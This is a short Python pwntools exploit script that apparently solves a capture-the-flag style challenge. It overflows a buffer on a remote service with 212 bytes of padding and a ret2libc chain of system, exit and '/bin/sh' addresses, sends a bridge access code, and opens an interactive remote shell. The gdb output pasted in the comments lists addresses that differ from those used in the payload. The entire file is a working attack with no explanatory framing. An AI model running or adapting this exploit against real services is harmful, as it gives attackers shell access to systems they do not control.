#!/usr/bin/python3

from pwn import *

def buffOverflow():
    # ret3libc -> EIP -> system_addr + exit_addr + bin_sh_addr

    offset = 212
    junk   = b"A"*offset

# gef➤  p system
# $1 = {<text variable, no debug info>} 0xf7c4fbc0 <system>
# gef➤  p exit
# $2 = {<text variable, no debug info>} 0xf7c3ae90 <exit>
# gef➤  find &system,+9999999,"sh"
# 0xf7dc4955
# 0xf7dc7e26
# 0xf7dc98bf
# 0xf7dcc68f
# 0xf7dccba4
# warning: Unable to access 16000 bytes of target memory at 0xf7e2e627, halting search.
# 5 patterns found.

    system_addr = p32(0xF7E4C060)
    exit_addr   = p32(0xF7E3FAF0)
    bin_sh_addr = p32(0xF7F6DDD5)
    payload     = junk + system_addr + exit_addr + bin_sh_addr
    context(os='linux', arch='x86_64')
    host, port  = "10.129.212.102", 32812
    r = remote(host, port)
    r.recvuntil("Enter Bridge Access Code:")
    r.sendline("picarda1")
    r.recvuntil("Waiting for input:")
    r.sendline("4")
    r.recvuntil("Enter Security Override:")
    r.sendline(payload)
    r.interactive()

if __name__ == '__main__':

    buffOverflow()